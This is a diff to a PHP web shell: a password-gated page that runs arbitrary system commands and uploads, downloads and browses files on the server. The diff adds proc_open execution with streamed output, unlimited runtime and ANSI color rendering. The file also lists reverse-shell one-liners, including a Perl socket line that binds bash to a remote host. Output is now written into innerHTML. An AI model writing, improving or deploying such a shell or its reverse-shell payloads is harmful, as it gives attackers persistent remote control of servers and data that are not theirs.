@@ -1,5 +1,12 @@
 <?php
 ob_start();
+set_time_limit(0);  // Unlimited time
+ini_set('memory_limit', '-1');  // Unlimited memory (be careful)
+ini_set('output_buffering', 'off');
+ini_set('zlib.output_compression', 0);
+while (ob_get_level())
+    ob_end_flush();
+ob_implicit_flush(1);
 
 // ?   PROTECTED LOGIN START
 $MASTER_PASSWORD = 'yourStrongMasterPasswordHere';
@@ -111,7 +118,7 @@ function check_command_execution()
     /*
      * Checks what commands can be executed using PHP
      */
-    $methods = ['shell_exec', 'exec', 'system', 'passthru', 'popen'];
+    $methods = ['shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open'];
     $available = [];
 
     // Get disabled functions from php.ini
@@ -183,6 +190,35 @@ function execute_command($cmd, $available_methods)
                         return rtrim($output);
                 }
                 break;
+            case 'proc_open':
+                $descriptorspec = [
+                    0 => ['pipe', 'r'],
+                    1 => ['pipe', 'w'],
+                    2 => ['pipe', 'w'],
+                ];
+
+                $process = proc_open($cmd, $descriptorspec, $pipes);
+
+                if (is_resource($process)) {
+                    stream_set_blocking($pipes[1], false);
+                    stream_set_blocking($pipes[2], false);
+
+                    $output = '';
+                    while (!feof($pipes[1]) || !feof($pipes[2])) {
+                        $output .= fread($pipes[1], 1024);
+                        $output .= fread($pipes[2], 1024);
+                        flush();
+                        usleep(100000);  // avoid 100% CPU usage
+                    }
+
+                    fclose($pipes[1]);
+                    fclose($pipes[2]);
+                    proc_close($process);
+
+                    if (!empty($output))
+                        return rtrim($output);
+                }
+                break;
         }
     }
 
@@ -246,12 +282,15 @@ function is_in_docker(): int
     return intval(($score / $max_score) * 100);
 }
 
-function listDirectory($path) {
+function listDirectory($path)
+{
     $path = realpath($path);
-    if (!$path || !is_dir($path)) return;
+    if (!$path || !is_dir($path))
+        return;
 
     $items = @scandir($path);
-    if (!$items) return;
+    if (!$items)
+        return;
 
     // Filter out '.' and '..' and reindex
     $items = array_values(array_filter($items, fn($item) => $item !== '.' && $item !== '..'));
@@ -282,6 +321,57 @@ function listDirectory($path) {
     }
     echo '</ul>';
 }
+
+function ansi_to_html($text)
+{
+    $text = htmlspecialchars($text);  // Avoid HTML injection
+    $open = false;
+
+    $text = preg_replace_callback('/\x1b\[(.*?)m/', function ($matches) use (&$open) {
+        $codes = explode(';', $matches[1]);
+        $styles = [];
+
+        foreach ($codes as $code) {
+            $code = intval($code);
+            if ($code === 0) {
+                $out = $open ? '</span>' : '';
+                $open = false;
+                return $out;
+            }
+            if ($code === 1)
+                $styles[] = 'font-weight:bold';
+            if ($code === 4)
+                $styles[] = 'text-decoration:underline';
+            if ($code >= 30 && $code <= 37) {
+                $colors = ['black', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white'];
+                $styles[] = 'color:' . $colors[$code - 30];
+            }
+            if ($code >= 90 && $code <= 97) {
+                $colors = ['gray', 'lightcoral', 'lightgreen', 'lightyellow', 'lightblue', 'violet', 'lightcyan', 'white'];
+                $styles[] = 'color:' . $colors[$code - 90];
+            }
+            if ($code >= 40 && $code <= 47) {
+                $bgColors = ['black', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white'];
+                $styles[] = 'background-color:' . $bgColors[$code - 40];
+            }
+        }
+
+        if (!empty($styles)) {
+            $out = $open ? '</span>' : '';
+            $open = true;
+            return $out . '<span style="' . implode(';', $styles) . '">';
+        }
+
+        return '';
+    }, $text);
+
+    if ($open) {
+        $text .= '</span>';  // close any remaining open tag
+    }
+
+    return $text;
+}
+
 // ! FUNCTIONS STOP
 
 // ? VARIABLES START
@@ -309,7 +399,7 @@ $services = [
     ],
     'Python' => [
         'status' => check_install('python --help', 'usage: python', $available_ce_methods),
-        'version' => get_regex_version('python --version 2>&1','/Python\s+([\d.]+)/', $available_ce_methods),
+        'version' => get_regex_version('python --version 2>&1', '/Python\s+([\d.]+)/', $available_ce_methods),
         'shell' => 'a'
     ],
     'PHP' => [
@@ -321,7 +411,7 @@ $services = [
         'status' => check_install('perl --help', 'Usage: perl', $available_ce_methods),
         'version' => get_regex_version('perl --version 2>&1', '/\(v([\d\.]+)\)/', $available_ce_methods),
         'shell' => 'perl -e \'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};\''
-    ],    
+    ],
     'Ruby' => [
         'status' => check_install('ruby --help', 'ruby [switches]', $available_ce_methods),
         'version' => get_regex_version('ruby --version 2>&1', '/ruby\s+([\d\.]+)p\d+/', $available_ce_methods),
@@ -384,8 +474,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile']) && iss
     exit;
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'GET' 
-    && isset($_GET['urlUpload'], $_GET['urlUploadName'], $_GET['uploadPath'])) {
+if ($_SERVER['REQUEST_METHOD'] === 'GET' &&
+        isset($_GET['urlUpload'], $_GET['urlUploadName'], $_GET['uploadPath'])) {
     /* UPLOAD FILE WITH CURL */
 
     header('Content-Type: application/json');
@@ -416,7 +506,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET'
         echo json_encode(['success' => true]);
     } else {
         // Remove incomplete file
-        if (file_exists($destination)) unlink($destination);
+        if (file_exists($destination))
+            unlink($destination);
         echo json_encode(['success' => false, 'error' => "Failed to download file: $curlErr"]);
     }
     exit;
@@ -428,10 +519,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['download'])) {
     $filePath = realpath($_GET['download']);
 
     // Optionally restrict base directory:
-    $baseDir = realpath(__DIR__); // or wherever your files live
+    $baseDir = realpath(__DIR__);  // or wherever your files live
     if (!$filePath || strpos($filePath, $baseDir) !== 0 || !is_file($filePath)) {
         http_response_code(404);
-        echo "File not found or access denied.";
+        echo 'File not found or access denied.';
         exit;
     }
 
@@ -505,8 +596,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
 
     // Change working directory
     chdir($path);
-
     $output = execute_command($cmd, $method);
+    $use_ansi = isset($_POST['use_ansi']) && $_POST['use_ansi'] === '1';
+    if ($use_ansi){
+        $output = ansi_to_html($output);
+    }
     echo json_encode(['success' => true, 'output' => $output]);
     exit;
 }
@@ -708,6 +802,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
             user-select: none;
         }
         #cmdOutput {
+            background:black;
+            color:white;
             padding: 1rem;
             flex-grow: 1;
             overflow-y: auto;
@@ -741,19 +837,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                     foreach ($services as $name => $service) {
                         $is_disabled = isset($service['status']) && $service['status'] === 'NO';
                         $has_shell = !empty($service['shell'] ?? '');
-                    
+
                         // Determine class
                         $class = $is_disabled ? 'btn-red' : 'btn';
-                    
+
                         // Determine attributes
                         if ($is_disabled || !$has_shell) {
                             $attributes = 'disabled';
                         } else {
-                            $escaped_shell = htmlspecialchars(str_replace("'", "\\'", $service['shell']));
+                            $escaped_shell = htmlspecialchars(str_replace("'", "\'", $service['shell']));
                             $attributes = 'onclick="genShell(\'' . $escaped_shell . '\')"';
                         }
                         echo '<button class="' . $class . '" ' . $attributes . '>' . htmlspecialchars($name) . '&nbsp;:&nbsp;' . htmlspecialchars($service['version']) . '</button>' . PHP_EOL;
-                    }                
+                    }
                     ?>
                 </div>
             </div>
@@ -792,12 +888,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                         <option value="<?= htmlspecialchars($method) ?>"><?= htmlspecialchars($method) ?></option>
                     <?php endforeach; ?>
                     </select>
+                    <label for="cmdInputColors">
+                        ANSI&nbsp;Colors:
+                    </label>
+                    <input style="width: auto" type="checkbox" id="cmdInputColors" checked>
                 </div>
             </div>
             <div class="card" style="flex-grow: 1; display: flex; flex-direction: column; overflow: hidden">
                 <div class="flex-row" style="width: 100%">
                     <label style="text-wrap:nowrap" for="cmdInput">
-                        <span style="color:#0f0"><?php echo execute_command("whoami", $available_ce_methods)?><span style="color:white">@</span><?php echo execute_command("hostname", $available_ce_methods)?></span>:<span style="color:#4d90fe" class="selectedPath">/</span>$
+                        <span style="color:#0f0"><?php echo execute_command('whoami', $available_ce_methods) ?><span style="color:white">@</span><?php echo execute_command('hostname', $available_ce_methods) ?></span>:<span style="color:#4d90fe" class="selectedPath">/</span>$
                     </label>
                     <input type="text" id="cmdInput" placeholder="Enter shell command">
                 </div>
@@ -825,6 +925,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
 
             const method = document.getElementById('cmdMethod').value;
             const path = document.getElementsByClassName('selectedPath')[0].value || '/';
+            const ansiColors = document.getElementById('cmdInputColors').checked;
 
             fetch(window.location.pathname, {
                 method: 'POST',
@@ -832,7 +933,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                 body: new URLSearchParams({
                     exec_cmd: cmd,
                     exec_method: method,
-                    exec_path: path
+                    exec_path: path,
+                    use_ansi: ansiColors ? '1' : '0'
                 })
             })
             .then(res => res.json())
@@ -842,11 +944,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                     ? `${timestamp} $ ${cmd}\n${data.output.trim()}\n\n`
                     : `${timestamp} $ ${cmd}\nError: ${data.error}\n\n`;
 
-                cmdOutputEl.textContent = output + cmdOutputEl.textContent;
+                cmdOutputEl.innerHTML = output + cmdOutputEl.innerHTML;
                 e.target.value = '';
             })
             .catch(err => {
-                cmdOutputEl.textContent = `\nError: ${err.message}\n` + cmdOutputEl.textContent;
+                cmdOutputEl.innerHTML = `\nError: ${err.message}\n` + cmdOutputEl.innerHTML;
             });
         }
     });
